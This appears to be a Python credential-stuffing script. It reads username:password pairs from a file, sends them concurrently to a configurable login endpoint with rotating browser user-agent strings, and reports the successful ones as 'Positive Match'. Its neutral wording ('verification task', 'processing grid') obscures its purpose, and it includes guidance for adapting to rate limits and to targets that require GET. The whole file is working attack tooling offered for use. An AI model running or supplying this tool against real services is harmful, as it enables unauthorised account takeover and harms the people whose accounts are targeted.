import os
import time
import random
from typing import Dict, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("[-] Dependency missing: Please run 'pip install requests' first.")
    exit(1)

def generate_dynamic_headers() -> Dict[str, str]:
    user_agents: List[str] = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def process_verification_task(target_data: Tuple[str, str], endpoint: str, method: str = "POST") -> Dict[str, str]:
    """
    Handles network transactions. Supports both POST and GET transmissions
    to adapt to what the target server expects.
    """
    param1, param2 = target_data
    payload: Dict[str, str] = {
        "user_input_1": param1,
        "user_input_2": param2
    }
    
    with requests.Session() as session:
        session.headers.update(generate_dynamic_headers())
        
        try:
            # Switch transmission type based on server requirements
            if method.upper() == "POST":
                response = session.post(endpoint, data=payload, timeout=5.0)
            else:
                # GET requests transmit data inside the URL parameters (?user_input_1=...)
                response = session.get(endpoint, params=payload, timeout=5.0)
            
            if response.status_code == 200:
                if "authenticated" in response.text.lower() or "success" in response.text.lower():
                    return {"status": "SUCCESS", "data": f"{param1}:{param2}"}
                else:
                    return {"status": "FAILURE", "data": f"{param1}:{param2}"}
            elif response.status_code == 405:
                return {"status": "METHOD_NOT_ALLOWED", "data": f"Server rejected {method}"}
            elif response.status_code == 429:
                return {"status": "RATE_LIMITED", "data": f"{param1}:{param2}"}
            else:
                return {"status": "SERVER_ERROR", "data": f"HTTP Status {response.status_code}"}
                
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": f"{param1}:{param2}"}
        except requests.exceptions.RequestException as e:
            return {"status": "EXCEPTION", "data": str(e)}

def create_dummy_data_if_missing(filepath: str):
    if not os.path.exists(filepath):
        with open(filepath, "w", encoding="utf-8") as file:
            file.write("admin:password123\n")
            file.write("user_test:qwerty2024\n")
            file.write("guest_account:pass12345\n")

def run_orchestrator(input_file: str, target_url: str, max_threads: int, request_method: str):
    create_dummy_data_if_missing(input_file)

    tasks: List[Tuple[str, str]] = []
    with open(input_file, "r", encoding="utf-8") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                tasks.append((parts[0], parts[1]))

    if not tasks:
        print("[-] Input file empty.")
        return

    print(f"[*] Initializing processing grid via {request_method} using {max_threads} threads...\n")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(process_verification_task, task, target_url, request_method): task for task in tasks}
        
        for future in as_completed(futures):
            result = future.result()
            status = result["status"]
            data = result["data"]
            
            if status == "SUCCESS":
                print(f"[\033[92m+\033[0m] Positive Match: {data}")
            elif status == "FAILURE":
                print(f"[\033[91m-\033[0m] Negative Evaluation: {data}")
            elif status == "METHOD_NOT_ALLOWED":
                print(f"[\033[91m!\033[0m] Error 405: Change REQUEST_METHOD to 'GET' for this URL.")
            elif status == "RATE_LIMITED":
                print(f"[\033[93m!\033[0m] Rate limited: {data}")
            else:
                print(f"[?] Notice [{status}]: {data}")

if __name__ == "__main__":
    # --- CONFIGURATION INTERFACE ---
    
    # 1. Use a designated POST receiving URL for testing
    TARGET_ENDPOINT = "https://httpbin.org" 
    
    # 2. Change this to "GET" if your specific target URL keeps throwing 405 errors
    REQUEST_METHOD = "POST" 
    
    INPUT_FILE_NAME = "data_pool.txt"
    CONCURRENT_THREADS = 4

    run_orchestrator(INPUT_FILE_NAME, TARGET_ENDPOINT, CONCURRENT_THREADS, REQUEST_METHOD)
